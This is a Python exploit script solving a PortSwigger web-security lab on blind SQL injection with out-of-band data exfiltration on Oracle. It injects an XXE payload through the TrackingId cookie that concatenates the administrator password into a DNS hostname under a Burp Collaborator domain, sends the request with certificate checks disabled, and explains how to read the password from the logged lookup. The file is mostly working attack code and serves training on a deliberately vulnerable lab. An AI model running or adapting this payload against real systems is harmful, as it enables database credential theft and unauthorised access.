# Lab 17 — Blind SQL Injection: Out-of-Band Data Exfiltration
# PortSwigger: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
#
# Vulnerability: TrackingId cookie (query runs asynchronously)
# Aim:           Exfiltrate the administrator password via DNS, then log in
#
# DB: Oracle
#
# Technique:
#   Same XXE approach as Lab 16, but the Collaborator subdomain is built
#   dynamically by breaking the SQL string and injecting a subquery:
#
#   xmltype(
#     '<?xml ...SYSTEM "http://'          ← SQL string literal 1
#     || (SELECT password FROM users       ← subquery — returns password
#          WHERE username='administrator')
#     || '.COLLABORATOR.NET/">'            ← SQL string literal 2
#   )
#
#   Oracle concatenates the three parts before xmltype() parses the result.
#   The DNS hostname becomes: <password>.COLLABORATOR.NET
#   Collaborator logs the full hostname → read the password from the subdomain prefix.
#
# Requires: Burp Suite Pro — update COLLABORATOR_DOMAIN before running.
#
# Usage: python lab17.py <url>

import sys
import requests
import urllib3
from proxies import proxies
from sqli_utils import banner, section

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# ─── UPDATE THIS ────────────────────────────────────────────────────────────
COLLABORATOR_DOMAIN = "YOUR-COLLABORATOR-ID.burpcollaborator.net"
# ────────────────────────────────────────────────────────────────────────────


def build_payload(tracking_id, collab_domain):
    """
    Build the Oracle OOB exfiltration payload.

    The SQL string is broken into three parts concatenated with ||:
      Part 1: opening XML up to the URL start
      Part 2: subquery that returns the administrator password
      Part 3: closing XML with .collab_domain suffix

    Python string concatenation is used here (not an f-string) to keep
    the nested SQL single-quotes, Python quotes, and XML double-quotes
    clearly separated and avoid syntax errors.
    """
    xml_part1 = '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'
    xml_part2 = f'.{collab_domain}/"> %remote;]>'

    return (
        f"{tracking_id}' UNION SELECT EXTRACTVALUE(xmltype("
        f"'{xml_part1}'"
        f"||(SELECT password FROM users WHERE username='administrator')||"
        f"'{xml_part2}'"
        f"),'/l') FROM dual--"
    )


if __name__ == "__main__":
    banner()
    section("LAB 17 — BLIND SQLi: OOB DATA EXFILTRATION (ORACLE)")

    if len(sys.argv) != 2:
        print("  Usage: python lab17.py <url>")
        sys.exit(1)

    if COLLABORATOR_DOMAIN == "YOUR-COLLABORATOR-ID.burpcollaborator.net":
        print("  ✘  Update COLLABORATOR_DOMAIN in the script before running.")
        sys.exit(1)

    url = sys.argv[1]
    session = requests.Session()
    session.verify   = False
    session.proxies  = proxies

    session.get(url)
    tracking_id = session.cookies.get("TrackingId")

    payload = build_payload(tracking_id, COLLABORATOR_DOMAIN)
    print(f"\n  ➜  Sending exfiltration payload...")
    print(f"  ➜  Collaborator domain: {COLLABORATOR_DOMAIN}\n")

    session.get(url, cookies={"TrackingId": payload})

    print("  ✔  Payload sent.")
    print("  ➜  Open Burp Collaborator → click 'Poll now'.")
    print("  ➜  The DNS interaction hostname prefix IS the administrator password.")
    print(f"     e.g.  secretpassword.{COLLABORATOR_DOMAIN}")
